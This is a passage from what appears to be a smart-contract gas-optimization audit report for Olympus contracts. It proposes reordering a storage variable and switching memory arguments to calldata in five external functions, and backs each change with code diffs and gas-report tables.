Heart, false = stopped, true = beating -    bool public active; -      /// @notice Timestamp of the last beat (UTC, in seconds)      uint256 public lastBeat;   @@ -41,6 +38,9 @@ contract OlympusHeart is IHeart, Policy, ReentrancyGuard {      /// @notice Reward token address that users are sent for beating the Heart      ERC20 public rewardToken;   +    /// @notice Status of the Heart, false = stopped, true = beating +    bool public active; +      // Modules      OlympusPrice internal PRICE;  ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..9682b00 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -336,13 +336,13 @@  ╞══════════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡  │ Deployment Cost                              ┆ Deployment Size ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 934119                                       ┆ 4277            ┆       ┆        ┆       ┆         │ +│ 917440                                       ┆ 4309            ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ active                                       ┆ 323             ┆ 989   ┆ 323    ┆ 2323  ┆ 3       │ +│ active                                       ┆ 340             ┆ 1006  ┆ 340    ┆ 2340  ┆ 3       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ beat                                         ┆ 5429            ┆ 29228 ┆ 18552  ┆ 61386 ┆ 8       │ +│ beat                                         ┆ 5443            ┆ 28492 ┆ 18566  ┆ 59400 ┆ 8       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                        ┆ 24123           ┆ 24123 ┆ 24123  ┆ 24123 ┆ 11      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -362,7 +362,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setRewardTokenAndAmount                      ┆ 8222            ┆ 13892 ┆ 13892  ┆ 19562 ┆ 2       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ toggleBeat                                   ┆ 1400            ┆ 7187  ┆ 8455   ┆ 10440 ┆ 4       │ +│ toggleBeat                                   ┆ 1427            ┆ 8416  ┆ 9577   ┆ 13083 ┆ 4       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ withdrawUnspentRewards                       ┆ 8201            ┆ 19621 ┆ 19621  ┆ 31041 ┆ 2       │  ╰──────────────────────────────────────────────┴─────────────────┴───────┴────────┴───────┴─────────╯ ```   ### [G&#x2011;05]  Using `calldata` instead of `memory` for read-only arguments in `external` functions saves gas When a function with a `memory` array is called externally, the `abi.decode()` step has to use a for-loop to copy each index of the `calldata` to the `memory` index. **Each iteration of this for-loop costs at least 60 gas** (i.e. `60 * <mem_array>.length`). Using `calldata` directly, obliviates the need for such a loop in the contract code and runtime execution. Note that even if an interface defines a function as having `memory` arguments, it's still valid for implementation contracs to use `calldata` arguments instead.   If the array is passed to an `internal` function which passes the array to another internal function where the array is modified and therefore `memory` is used in the `external` call, it's still more gass-efficient to use `calldata` when the `external` function uses modifiers, since the modifiers may prevent the internal functions from being called. Structs have the same overhead as an array of length one  Note that I've also flagged instances where the function is `public` but can be marked as `external` since it's not called by the contract, and cases where a constructor is involved  *There are 5 instances of this issue:* ```solidity File: src/modules/PRICE.sol  /// @audit startObservations_ 205       function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) 206           external 207:          permissioned  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L205-L207  ```solidity File: src/policies/BondCallback.sol  /// @audit tokens_ 152:      function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L152  ```solidity File: src/policies/Governance.sol  /// @audit proposalURI_ 159       function submitProposal( 160           Instruction[] calldata instructions_, 161           bytes32 title_, 162:          string memory proposalURI_  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159-L162  ```solidity File: src/policies/PriceConfig.sol  /// @audit startObservations_ 45        function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) 46            external 47:           onlyRole("price_admin")  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/PriceConfig.sol#L45-L47  ```solidity File: src/policies/TreasuryCustodian.sol  /// @audit tokens_ 53:       function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53  ```diff diff --git a/src/modules/PRICE.sol b/src/modules/PRICE.sol index 55d85d3..5a620d7 100644 --- a/src/modules/PRICE.sol +++ b/src/modules/PRICE.sol @@ -202,7 +202,7 @@ contract OlympusPrice is Module {      /// @param  lastObservationTime_ - Unix timestamp of last observation being provided (in seconds).      /// @dev    This function must be called after the Price module is deployed to activate it and after updating the observationFrequency      ///         or movingAverageDuration (in certain cases) in order for the Price module to function properly. -    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) +    function initialize(uint256[] calldata startObservations_, uint48 lastObservationTime_)          external          permissioned      { diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..902bcfc 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -149,7 +149,7 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {        /// @notice Send tokens to the TRSRY in a batch      /// @param  tokens_ - Array of tokens to send -    function batchToTreasury(ERC20[] memory tokens_) external onlyRole("callback_admin") { +    function batchToTreasury(ERC20[] calldata tokens_) external onlyRole("callback_admin") {          ERC20 token;          uint256 balance;          uint256 len = tokens_.length; diff --git a/src/policies/Governance.sol b/src/policies/Governance.sol index 8829e3b..a39dad0 100644 --- a/src/policies/Governance.sol +++ b/src/policies/Governance.sol @@ -159,7 +159,7 @@ contract OlympusGovernance is Policy {      function submitProposal(          Instruction[] calldata instructions_,          bytes32 title_, -        string memory proposalURI_ +        string calldata proposalURI_      ) external {          if (VOTES.balanceOf(msg.sender) * 10000 < VOTES.totalSupply() * SUBMISSION_REQUIREMENT)              revert NotEnoughVotesToPropose(); diff --git a/src/policies/PriceConfig.sol b/src/policies/PriceConfig.sol index 78887fd..214e0ab 100644 --- a/src/policies/PriceConfig.sol +++ b/src/policies/PriceConfig.sol @@ -42,7 +42,7 @@ contract OlympusPriceConfig is Policy {      /// @param lastObservationTime_ Unix timestamp of last observation being provided (in seconds).      /// @dev This function must be called after the Price module is deployed to activate it and after updating the observationFrequency      ///      or movingAverageDuration (in certain cases) in order for the Price module to function properly. -    function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_) +    function initialize(uint256[] calldata startObservations_, uint48 lastObservationTime_)          external          onlyRole("price_admin")      { diff --git a/src/policies/TreasuryCustodian.sol b/src/policies/TreasuryCustodian.sol index 1c12f2e..a240cd1 100644 --- a/src/policies/TreasuryCustodian.sol +++ b/src/policies/TreasuryCustodian.sol @@ -50,7 +50,7 @@ contract TreasuryCustodian is Policy {      // Anyone can call to revoke a deactivated policy's approvals.      // TODO Currently allows anyone to revoke any approval EXCEPT activated policies.      // TODO must reorg policy storage to be able to check for deactivated policies. -    function revokePolicyApprovals(address policy_, ERC20[] memory tokens_) external { +    function revokePolicyApprovals(address policy_, ERC20[] calldata tokens_) external {          if (Policy(policy_).isActive()) revert PolicyStillActive();            // TODO Make sure `policy_` is an actual policy and not a random address.  ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..513078c 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -108,7 +108,7 @@  ╞═════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                             ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1117743                                     ┆ 6851            ┆        ┆        ┆        ┆         │ +│ 1101930                                     ┆ 6772            ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                               ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -128,7 +128,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ getMovingAverage                            ┆ 544             ┆ 812    ┆ 544    ┆ 2420   ┆ 7       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ initialize                                  ┆ 4063            ┆ 432495 ┆ 512316 ┆ 886622 ┆ 24      │ +│ initialize                                  ┆ 2327            ┆ 430562 ┆ 510516 ┆ 883159 ┆ 24      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ initialized                                 ┆ 340             ┆ 955    ┆ 340    ┆ 2340   ┆ 13      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -258,7 +258,7 @@  ╞═════════════════════════════════════════════════════╪═════════════════╪═══════╪════════╪════════╪═════════╡  │ Deployment Cost                                     ┆ Deployment Size ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1408325                                             ┆ 6934            ┆       ┆        ┆        ┆         │ +│ 1386305                                             ┆ 6824            ┆       ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                       ┆ min             ┆ avg   ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -266,7 +266,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ approvedMarkets                                     ┆ 685             ┆ 685   ┆ 685    ┆ 685    ┆ 2       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ batchToTreasury                                     ┆ 4111            ┆ 12729 ┆ 12068  ┆ 22668  ┆ 4       │ +│ batchToTreasury                                     ┆ 3800            ┆ 12543 ┆ 11920  ┆ 22533  ┆ 4       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ callback                                            ┆ 7678            ┆ 98980 ┆ 85627  ┆ 187927 ┆ 17      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -289,7 +289,7 @@  ╞════════════════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                                        ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 1638243                                                ┆ 8250            ┆        ┆        ┆        ┆         │ +│ 1645850                                                ┆ 8288            ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                          ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -317,7 +317,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ setActiveStatus                                        ┆ 777             ┆ 1228   ┆ 777    ┆ 3577   ┆ 31      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ submitProposal                                         ┆ 11529           ┆ 176506 ┆ 187247 ┆ 187247 ┆ 25      │ +│ submitProposal                                         ┆ 11364           ┆ 176510 ┆ 187258 ┆ 187258 ┆ 25      │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ tokenClaimsForProposal                                 ┆ 684             ┆ 684    ┆ 684    ┆ 684    ┆ 1       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -430,7 +430,7 @@  ╞══════════════════════════════════════════════════════════╪═════════════════╪════════╪════════╪════════╪═════════╡  │ Deployment Cost                                          ┆ Deployment Size ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 639600                                                   ┆ 3262            ┆        ┆        ┆        ┆         │ +│ 620181                                                   ┆ 3165            ┆        ┆        ┆        ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                            ┆ min             ┆ avg    ┆ median ┆ max    ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -440,7 +440,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ configureDependencies                                    ┆ 24144           ┆ 24144  ┆ 24144  ┆ 24144  ┆ 5       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ initialize                                               ┆ 10107           ┆ 491657 ┆ 524236 ┆ 895872 ┆ 7       │ +│ initialize                                               ┆ 8371            ┆ 486274 ┆ 519133 ┆ 885906 ┆ 7       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ isActive                                                 ┆ 317             ┆ 317    ┆ 317    ┆ 317    ┆ 5       │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -453,7 +453,7 @@  ╞═══════════════════════════════════════════════════════════════╪═════════════════╪═══════╪════════╪═══════╪═════════╡  │ Deployment Cost                                               ┆ Deployment Size ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ -│ 739696                                                        ┆ 3762            ┆       ┆        ┆       ┆         │ +│ 719277                                                        ┆ 3660            ┆       ┆        ┆       ┆         │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ Function Name                                                 ┆ min             ┆ avg   ┆ median ┆ max   ┆ # calls │  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤ @@ -469,7 +469,7 @@  ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌┼╌╌╌╌╌╌╌╌╌┤  │ requestPermissions                                            ┆ 2061            ┆ 2477  ┆ 2061   ┆ 4561  ┆ 6       │  